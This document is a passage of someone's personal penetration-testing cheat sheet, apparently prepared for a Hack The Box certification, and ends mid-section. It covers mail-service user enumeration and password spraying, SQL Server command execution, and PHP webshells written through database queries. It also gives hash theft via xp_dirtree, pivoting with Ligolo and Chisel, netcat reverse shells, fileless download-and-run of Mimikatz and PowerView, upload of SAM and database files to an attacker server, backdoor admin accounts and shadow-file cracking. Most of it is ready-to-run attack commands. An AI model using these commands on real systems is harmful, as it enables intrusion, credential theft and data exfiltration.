+dig mx inlanefreight.com | grep "MX" | grep -v ";"
+
+host -t A mail1.inlanefreight.htb.
+```
+
+
+---
+
+<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e--automated-enumeration"></a>
+
+### Automated Enumeration
+
+smtp-user-enum
+```shell
+smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
+```
+
+O365 Spray
+```shell
+python3 o365spray.py --validate --domain msplaintext.xyz (check if it is o365)
+python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
+```
+
+---
+<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e--password-attacks"></a>
+
+### Password Attacks
+We can use hydra to perform a brute force, just change the protocol at the back (pop3,imap4,smtp)
+```shell
+hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+```
+
+If cloud services support SMTP, POP3 or IMAP4 protocols, we can use o365 to spray as hydra is usually blocked 
+```shell
+python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+```
+
+---
+<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e--vrfy-command"></a>
+
+#### VRFY Command
+Use this command after connecting to telnet to enumerate users on the system
+```shell
+telnet 10.10.110.20 25
+
+VRFY root
+VRFY www-data
+```
+
+<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e--expn-command"></a>
+
+#### EXPN Command
+Similar to VRFY but this one can query groups 
+```shell
+telnet 10.10.110.20 25
+
+EXPN john
+EXPN support-team
+EXPN all
+```
+
+<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e--rcpt-to-command"></a>
+
+#### RCPT TO Command
+Identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.
+```shell
+telnet 10.10.110.20 25
+
+MAIL FROM:test@htb.com
+RCPT TO:julio
+RCPT TO:john
+```
+
+<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e--user-command"></a>
+
+#### USER Command
+Enumerate users command again
+```shell
+telnet 10.10.110.20 110
+
+USER julio
+USER john
+```
+
+
+---
+
+<a id="cpts-exploits-service-exploits-sql-fcb4d003"></a>
+
+<a id="cpts-exploits-service-exploits-sql-fcb4d003--sql"></a>
+
+# SQL
+
+
+<a id="cpts-exploits-service-exploits-sql-fcb4d003--authentication-commands"></a>
+
+### Authentication commands
+```shell
+vernonlim03@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
+
+C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
+
+# Connect to mssql from linux
+vernonlim03@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
+vernonlim03@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 
+
+# Authenticate using Active Directory
+vernonlim03@htb[/htb]$ sqsh -S 10.129.203.7 -U <SERVERNAME>\\julio -P 'MyPassword!' -h
+```
+
+
+<a id="cpts-exploits-service-exploits-sql-fcb4d003--common-commands-in-mysql-shell"></a>
+
+### Common Commands in mysql shell
+```shell
+SHOW DATABASES;
+SELECT name FROM master.dbo.sysdatabases
+USE <database>
+SHOW TABLES;
+SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
+SELECT * FROM users;
+```
+(IF USING sqsh, rmb to execute 'go' after every command)
+
+
+<a id="cpts-exploits-service-exploits-sql-fcb4d003--xp_cmdshell-mssql"></a>
+
+### XP_CMDSHELL (mssql)
+```shell
+xp_cmdshell 'whoami'
+
+#Steps to enable xp_cmdshell
+EXECUTE sp_configure 'show advanced options', 1
+RECONFIGURE
+EXECUTE sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+```
+
+---
+
+<a id="cpts-exploits-service-exploits-sql-fcb4d003--writing-to-local-files-mysql"></a>
+
+### Writing to local files (mysql)
+```shell
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+
+(Try to enable secure_file_priv if unable to write)
+show variables like "secure_file_priv";
+
+```
+
+<a id="cpts-exploits-service-exploits-sql-fcb4d003--writing-to-local-files-mssql"></a>
+
+### Writing to local files (mssql)
+```shell
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+
+#Steps to enable file writing privileges
+sp_configure 'show advanced options', 1
+RECONFIGURE
+sp_configure 'Ole Automation Procedures', 1
+RECONFIGURE
+```
+
+---
+
+<a id="cpts-exploits-service-exploits-sql-fcb4d003--read-local-files-mysql"></a>
+
+### Read local files (mysql)
+```shell
+select LOAD_FILE("/etc/passwd");
+```
+<a id="cpts-exploits-service-exploits-sql-fcb4d003--read-local-files-mssql"></a>
+
+### Read local files (mssql)
+```shell
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+```
+
+---
+
+<a id="cpts-exploits-service-exploits-sql-fcb4d003--hash-stealing-with-responder"></a>
+
+### Hash stealing with responder
+
+Start responder or impacket-smbserver first on interface
+Then use XP_SUBDIRS or XP_DIRTREE to point to attacker machine
+```shell
+EXEC master..xp_dirtree '\\10.10.110.17\share\'
+EXEC master..xp_subdirs '\\10.10.110.17\share\'
+```
+
+
+--- 
+<a id="cpts-exploits-service-exploits-sql-fcb4d003--priv-esc-with-impersonate-privilege"></a>
+
+### Priv Esc with Impersonate Privilege
+
+SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user.
+
+**Identify users that we can impersonate**
+```shell
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+```
+
+**Verifying our Current User and Role**
+```shell
+SELECT SYSTEM_USER #Get current user
+SELECT IS_SRVROLEMEMBER('sysadmin') #Check if user is sysadmin (0 means no)
+```
+
+**Impersonating Users**
+```shell
+EXECUTE AS LOGIN = 'sa' #Impersonating the user: sa
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+```
+
+**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database.
+
+---
+
+<a id="cpts-exploits-service-exploits-sql-fcb4d003--communicate-with-other-databases-mssql"></a>
+
+### Communicate with other databases (mssql)
+
+Identify linked Servers in MSSQL
+```shell
+SELECT srvname, isremote FROM sysservers
+```
+
+Executing commands on linked server
+```shell
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+```
+
+
+---
+
+<a id="cpts-misc-convert-ccache-or-kirbi-file-to-and-fro-9b4c4171"></a>
+
+<a id="cpts-misc-convert-ccache-or-kirbi-file-to-and-fro-9b4c4171--convert-ccache-or-kirbi-file-to-and-fro"></a>
+
+# Convert ccache or kirbi file to and fro
+
+
+```shell
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+```
+
+
+---
+
+<a id="cpts-misc-double-pivot-ac26bf28"></a>
+
+<a id="cpts-misc-double-pivot-ac26bf28--double-pivot"></a>
+
+# Double Pivot
+
+
+1) Connect via RDP to the initial machine
+2) Bring SocksOverRDP.zip and Proxifier.zip to the machine
+3) Unzip both
+4) Ensure real time protection is disabled and run regsvr32.exe
+5) RDP to the second machine and bring over the socksoverrdp-server.exe
+6) Run it as admistrator
+7) On the initial machine, run proxifier app
+8) Under profiles add the loopback:1080 and press ok
+9) Then we can access the hidden system, if using RDP rmb to go to experience and set to modem
+
+
+```cmd-session
+regsvr32.exe SocksOverRDP-Plugin.dll
+```
+
+<a id="cpts-misc-double-pivot-ac26bf28--ligolo"></a>
+
+### Ligolo
+
+```shell
+# On attacker machine:
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 10.10.<private subnet>.0/24 dev ligolo
+cd ~/Downloads/scripts/pivoting/ligolo-ng/
+./proxy -selfcert
+
+# On target machine:
+wget 192.168.xxx.xxx:8000/pivoting/ligolo-ng/windows64-agent/agent.exe -O agent.exe
+./agent.exe -connect 192.168.xxx.xxx:11601 -ignore-cert
+
+# On attacker machine (in ligolo control panel):
+session
+<select session number>
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+start
+
+# On second pivot machine
+./agent.exe -connect <first machine ip>:11601 -ignore-cert
+session
+<select session number>
+
+sudo ip tuntap add mode tun appsrv-tunnel
+sudo ip link set appsrv-tunnel up
+sudo ip route add 172.16.6.0/24 dev appsrv-tunnel
+
+tunnel_start --tun appsrv-tunnel
+```
+
+
+---
+
+<a id="cpts-misc-gaining-shell-access-b83293f9"></a>
+
+<a id="cpts-misc-gaining-shell-access-b83293f9--gaining-shell-access"></a>
+
+# Gaining Shell Access
+
+
+<a id="cpts-misc-gaining-shell-access-b83293f9--windows"></a>
+
+### Windows
+- RDP
+- WINRM
+- WMI
+
+<a id="cpts-misc-gaining-shell-access-b83293f9--linux"></a>
+
+### Linux
+- SSH
+- Rsync (r-services)
+
+
+---
+
+<a id="cpts-misc-ms-office-macro-8ec8c7ff"></a>
+
+<a id="cpts-misc-ms-office-macro-8ec8c7ff--ms-office-macro"></a>
+
+# MS Office Macro
+
+Use the MMG-LO folder in the cpts-tools directory
+
+![Pasted image 20250618150605.png](cpts/assets/Pasted%20image%2020250618150605.png)
+
+```bash
+python3 mmg-ods.py windows 192.168.45.202 443
+```
+
+
+---
+
+<a id="cpts-misc-pivot-with-ligolo-111fca60"></a>
+
+<a id="cpts-misc-pivot-with-ligolo-111fca60--pivot-with-ligolo"></a>
+
+# Pivot with Ligolo
+
+```shell
+# On attacker machine:
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 10.10.<private subnet>.0/24 dev ligolo
+cd ~/Downloads/scripts/pivoting/ligolo-ng/
+./proxy -selfcert
+
+# On target machine:
+wget 192.168.xxx.xxx:8000/pivoting/ligolo-ng/windows64-agent/agent.exe -O agent.exe
+./agent.exe -connect 192.168.xxx.xxx:11601 -ignore-cert
+
+# On attacker machine (in ligolo control panel):
+session
+<select session number>
+start
+
+# To allow machines in the private subnet to reach your host machine
+listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 (to access nc listener of port 4444)
+listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80 (to access webserver)
+listener_add --addr 0.0.0.0:1236 --to 127.0.0.1:8010 (to access upload server)
+
+# On the target machine:
+do not use attacker machine ip, but the machine you are tunneling from.
+i.e.
+Attacker 192.168.234.63
+ms01 192.168.77.10 10.10.77.10 (comprimised machine)
+ms02 10.10.77.11
+
+# On attacker machine:
+nc -lvnp 4444
+
+# On target ms02:
+nc 10.10.77.10 1234 -e powershell
+```
+
+
+
+---
+
+<a id="cpts-misc-runas-another-user-4be36188"></a>
+
+<a id="cpts-misc-runas-another-user-4be36188--runas-another-user"></a>
+
+# Runas another user
+
+```cmd
+runas /user:Administrator "nc.exe -e cmd.exe 192.168.45.202 4444"
+runas /user:Administrator "reverse.exe"
+```
+
+
+---
+
+<a id="cpts-misc-search-for-flag-on-compromised-system-225a86d6"></a>
+
+<a id="cpts-misc-search-for-flag-on-compromised-system-225a86d6--search-for-flag-on-compromised-system"></a>
+
+# Search for flag on compromised system
+
+
+<a id="cpts-misc-search-for-flag-on-compromised-system-225a86d6--linux"></a>
+
+#### Linux
+```bash
+find / -type f -iname "flag.txt" 2>/dev/null
+find / -type f -iname "local.txt" 2>/dev/null
+find / -type f -iname "proof.txt" 2>/dev/null
+find / -type f -iname "user.txt" 2>/dev/null
+find / -type f -iname "root.txt" 2>/dev/null
+```
+
+<a id="cpts-misc-search-for-flag-on-compromised-system-225a86d6--windows"></a>
+
+#### Windows
+```cmd
+dir /r /s c:\*local.txt
+dir /a /s c:\*proof.txt
+Get-ChildItem -Path C:\ -Recurse -Force -Filter *local*.txt
+Get-ChildItem -Path C:\ -Recurse -Force -Filter *proof*.txt
+```
+
+
+
+---
+
+<a id="cpts-misc-transferring-files-linux-5d70baa3"></a>
+
+<a id="cpts-misc-transferring-files-linux-5d70baa3--transferring-files-linux"></a>
+
+# Transferring Files (Linux)
+
+
+<a id="cpts-misc-transferring-files-linux-5d70baa3--base64-encodedecode"></a>
+
+#### Base64 Encode/Decode
+
+On Kali:
+```bash
+md5sum id_rsa #take note of the hash value of the file
+
+cat id_rsa | base64 -w 0;echo 
+```
+
+On Victim Linux:
+```shell
+echo -n '<BASE64 ENCODED STRING>' | base64 -d > id_rsa
+
+md5sum id_rsa # check if md5 sum matches
+```
+
+
+<a id="cpts-misc-transferring-files-linux-5d70baa3--web-downloads-with-wget-and-curl"></a>
+
+#### Web Downloads with Wget and cURL
+
+```shell
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+```
+
+
+<a id="cpts-misc-transferring-files-linux-5d70baa3--fileless-downloads-with-wget-and-curl"></a>
+
+#### Fileless Downloads with Wget and cURL
+
+```shell
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+
+wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+```
+
+
+<a id="cpts-misc-transferring-files-linux-5d70baa3--download-using-bash-dev-tcp"></a>
+
+#### Download using bash dev tcp
+
+```shell
+exec 3<>/dev/tcp/10.10.10.32/80
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+cat <&3
+```
+
+
+<a id="cpts-misc-transferring-files-linux-5d70baa3--secure-copy-ssh"></a>
+
+#### Secure Copy (SSH)
+
+```shell
+scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
+```
+
+<a id="cpts-misc-transferring-files-linux-5d70baa3--upload-server"></a>
+
+#### Upload Server
+```bash
+python -m venv myfirstproject
+source myfirstproject/bin/activate
+pip install uploadserver
+python -m uploadserver 80
+
+#command to upload from victim
+curl -X POST http://192.168.45.224/upload -F 'files=@db.sqlite3'
+```
+
+
+---
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9"></a>
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--transferring-files-windows"></a>
+
+# Transferring Files (Windows)
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--python-server-certutil"></a>
+
+#### Python Server + Certutil
+
+On Kali:
+```shell
+python3 -m http.server 80
+```
+
+On Windows:
+
+```Shell
+certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt
+```
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--base64-encodedecode"></a>
+
+#### Base64 Encode/Decode
+On Kali:
+```bash
+md5sum id_rsa #take note of the hash value of the file
+
+cat id_rsa | base64 -w 0;echo 
+```
+
+On Windows:
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64 ENCODE>"))
+
+Get-FileHash C:\Users\Public\id_rsa -Algorithm md5 #verify md5 hash
+```
+
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--powershell-web-downloads"></a>
+
+#### Powershell Web Downloads
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--file-download"></a>
+
+###### File Download
+```powershell
+(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+
+(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
+```
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--fileless-download"></a>
+
+###### Fileless Download
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+```
+
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--powershell-invoke-web-request"></a>
+
+#### Powershell Invoke Web Request
+```powershell
+Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+```
+
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--bypass-download-commands"></a>
+
+#### Bypass Download Commands
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--internet-explorer-bypass"></a>
+
+###### Internet Explorer Bypass
+```powershell
+Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
+```
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--untrusted-ssltls-certificate"></a>
+
+###### Untrusted SSL/TLS Certificate
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+```
+
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--smb-transfer"></a>
+
+#### SMB Transfer
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--start-smb-server"></a>
+
+###### Start SMB Server
+On Kali:
+```shell
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+```
+
+On Windows:
+```bash
+net use n: \\192.168.220.133\share /user:test test
+
+copy n:\nc.exe
+```
+
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--ftp-transfer"></a>
+
+#### FTP Transfer
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--start-ftp-server"></a>
+
+###### Start FTP Server
+On Kali:
+```shell
+sudo python3 -m pyftpdlib --port 21
+```
+
+On Powershell:
+```powershell
+(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+```
+
+On Shell:
+```shell
+C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+C:\htb> echo USER anonymous >> ftpcommand.txt
+C:\htb> echo binary >> ftpcommand.txt
+C:\htb> echo GET file.txt >> ftpcommand.txt
+C:\htb> echo bye >> ftpcommand.txt
+C:\htb> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+Log in with USER and PASS first.
+ftp> USER anonymous
+
+ftp> GET file.txt
+```
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--xfreerdp"></a>
+
+#### XfreeRDP
+```bash
+xfreerdp /drive:kali,.
+```
+
+
+<a id="cpts-misc-transferring-files-windows-089b5bd9--upload-server"></a>
+
+#### Upload Server
+```bash
+python -m venv myfirstproject
+source myfirstproject/bin/activate
+pip install uploadserver
+python -m uploadserver 80
+
+#command to upload from victim
+curl.exe -X POST http://192.168.45.202/upload -F "files=@C:\sam.save"
+```
+
+
+---
+
+<a id="cpts-misc-transferring-files-9a1f8b61"></a>
+
+<a id="cpts-misc-transferring-files-9a1f8b61--transferring-files"></a>
+
+# Transferring Files
+
+
+<a id="cpts-misc-transferring-files-9a1f8b61--wget"></a>
+
+### wget
+
+On Kali
+```bash
+cd /tmp
+python3 -m http.server 8000
+```
+
+On Victim
+```bash
+wget http://10.10.14.1:8000/linenum.sh
+```
+```bash
+curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
+```
+(-o is for output name)
+
+
+<a id="cpts-misc-transferring-files-9a1f8b61--scp"></a>
+
+### scp
+
+On Kali
+```bash
+scp linenum.sh user@remotehost:/tmp/linenum.sh
+```
+![Pasted image 20250325024416.png](cpts/assets/Pasted%20image%2020250325024416.png)
+
+
+<a id="cpts-misc-transferring-files-9a1f8b61--using-base64-firewall-evasion"></a>
+
+### Using Base64 (Firewall evasion)
+
+Only use this if firewall ends up blocking our other methods
+
+On Kali
+![Pasted image 20250325025014.png](cpts/assets/Pasted%20image%2020250325025014.png)
+```bash
+base64 shell -w 0
+```
+Ctrl-C the value afterwards
+
+
+On Victim
+![Pasted image 20250325025103.png](cpts/assets/Pasted%20image%2020250325025103.png)
+```bash
+echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAlIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
+```
+
+
+<a id="cpts-misc-transferring-files-9a1f8b61--python"></a>
+
+#### Python
+
+```shell
+p
+
+python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+
+```
+
+
+<a id="cpts-misc-transferring-files-9a1f8b61--php"></a>
+
+#### PHP
+
+```shell
+php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+
+php -r 'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+
+# Fileless method
+php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```
+
+
+<a id="cpts-misc-transferring-files-9a1f8b61--ruby"></a>
+
+#### Ruby
+
+```shell
+ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+```
+
+
+<a id="cpts-misc-transferring-files-9a1f8b61--perl"></a>
+
+#### Perl
+
+```shell
+perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+```
+
+
+<a id="cpts-misc-transferring-files-9a1f8b61--javascript"></a>
+
+#### Javascript
+
+ Save this script to wget.js
+```javascript
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+```
+
+After doing the above execute this command to download files
+```shell
+cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+```
+
+
+<a id="cpts-misc-transferring-files-9a1f8b61--vbscript"></a>
+
+#### VBScript
+
+Save this script to wget.vbs
+```vbscript
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+```
+
+After doing the above 
+```shell
+cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+```
+
+
+<a id="cpts-misc-transferring-files-9a1f8b61--netcat"></a>
+
+#### Netcat
+
+On Receiving Machine:
+```bash
+nc -l -p 8000 > SharpKatz.exe
+ncat -l -p 8000 --recv-only > SharpKatz.exe
+```
+
+On Sending Machine:
+```shell
+nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+```
+
+<a id="cpts-misc-transferring-files-9a1f8b61--netcat-second-method"></a>
+
+##### Netcat (Second Method)
+
+On Sending Machine:
+```shell
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+```
+
+On Receiving Machine:
+```shell
+nc 192.168.49.128 443 > SharpKatz.exe
+
+cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+```
+
+
+<a id="cpts-misc-transferring-files-9a1f8b61--winrm-file-transfer"></a>
+
+#### WinRM - File Transfer
+
+```powershell
+$Session = New-PSSession -ComputerName DATABASE01
+
+Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+
+Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+
+<a id="cpts-misc-transferring-files-9a1f8b61--rdp-file-transfer"></a>
+
+#### RDP - File Transfer
+
+<a id="cpts-misc-transferring-files-9a1f8b61--mounting-share"></a>
+
+###### Mounting Share
+```shell
+xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+
+rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+```
+
+
+
+---
+
+<a id="cpts-misc-make-new-admin-user-in-windows-e17c21fa"></a>
+
+<a id="cpts-misc-make-new-admin-user-in-windows-e17c21fa--make-new-admin-user-in-windows"></a>
+
+# make new admin user in windows
+
+
+```cmd
+net user vernon password /add
+net localgroup administrators vernon /add
+```
+
+
+---
+
+<a id="cpts-misc-non-tty-shell-to-tty-shell-7f6f46ec"></a>
+
+<a id="cpts-misc-non-tty-shell-to-tty-shell-7f6f46ec--non-tty-shell-to-tty-shell"></a>
+
+# non-tty shell to tty shell
+
+
+Test to see any of these are installed on the system we can then use the installed service to upgrade our non-tty shell to a tty shell.
+
+
+```bash
+#python to tty shell
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+#/bin/sh to shell
+/bin/sh -i
+sh: no job control in this shell
+sh-4.2$
+
+# perl to shell
+perl —e 'exec "/bin/sh";'
+
+perl: exec "/bin/sh";
+
+# ruby to shell
+ruby: exec "/bin/sh"
+
+# lua to shell
+lua: os.execute('/bin/sh')
+
+# awk to shell
+awk 'BEGIN {system("/bin/sh")}'
+
+# find to shell
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+
+# vim to shell
+vim -c ':!/bin/sh'
+
+# vim escape
+vim
+:set shell=/bin/sh
+:shell
+
+# permission consideration
+ls -la <path/to/fileorbinary>
+
+# sudo -l to see what we can do for priv esc
+sudo -l
+
+```
+
+
+
+
+---
+
+<a id="cpts-post-exploits-port-forwarding-d33c6cbd"></a>
+
+<a id="cpts-post-exploits-port-forwarding-d33c6cbd--port-forwarding"></a>
+
+# Port Forwarding
+
+
+<a id="cpts-post-exploits-port-forwarding-d33c6cbd--chisel"></a>
+
+### Chisel
+
+On kali
+```bash
+./chisel_1.10.1_linux_amd64 server -port 2222 --socks5 -reverse
+```
+
+On Pivot Machine
+```
+./chisel_1.10.1_linux_amd64 client <ATTACKER_IP>:2222 R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
+./chisel_1.10.1_linux_amd64 client 192.168.45.202:2222 R:2344:10.4.181.215:22
+
+```
+
+Then do whatever service I want at loopback addy and port specified in first command
+```bash
+ssh database_admin@127.0.0.1 -p 2222
+```
+
+
+<a id="cpts-post-exploits-port-forwarding-d33c6cbd--ssh"></a>
+
+### SSH
+
+```
+ssh dev@192.168.223.150 -L 8000:127.0.0.1:8000
+
+#then we can just point to 127.0.0.1 port 8000 to get shit done
+```
+
+
+---
+
+<a id="cpts-post-exploits-linux-cracking-login-credentials-3cabf121"></a>
+
+<a id="cpts-post-exploits-linux-cracking-login-credentials-3cabf121--cracking-login-credentials"></a>
+
+# Cracking Login Credentials
+
+- /etc/passwd
+- /etc/shadow
+- /etc/security/opasswd
+
+---
+<a id="cpts-post-exploits-linux-cracking-login-credentials-3cabf121--etcpasswd"></a>
+
+### /etc/passwd
+
+Try to look for available users first
+See if the file is writable
+If it is writable, just remove the password fielded with an x behind the root user and su to root
+
+---
+
+<a id="cpts-post-exploits-linux-cracking-login-credentials-3cabf121--etcshadow"></a>
+
+### /etc/shadow
+
+Nothing much we can do with this file as well 
+Just check if it is writable and delete the encrypted password portion and see where it leads
+
+
+---
+
+<a id="cpts-post-exploits-linux-cracking-login-credentials-3cabf121--cracking-credentials"></a>
+
+### Cracking credentials
+
+<a id="cpts-post-exploits-linux-cracking-login-credentials-3cabf121--passwd-shadow"></a>
+
+###### Passwd + Shadow
+```shell
+vernonlim03@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
+vernonlim03@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
+vernonlim03@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
+vernonlim03@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
+```
+
+<a id="cpts-post-exploits-linux-cracking-login-credentials-3cabf121--opasswd"></a>
+
+###### Opasswd
+```shell
+vernonlim03@htb[/htb]$ sudo cat /etc/security/opasswd
+
+cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
+
+# Output the last field behind the $ and put them in md5-hashes.list
+
+vernonlim03@htb[/htb]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
+```
+
+
+---
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf"></a>
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--credential-hunting"></a>
+
+# Credential Hunting
+
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--key-files-to-look-for"></a>
+
+### Key files to look for
+![Pasted image 20250429162547.png](cpts/assets/Pasted%20image%2020250429162547.png)
+
+<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--command-to-search-for-configuration-files-based-on-extension"></a>
+
+#### Command to search for configuration files based on extension
+```shell
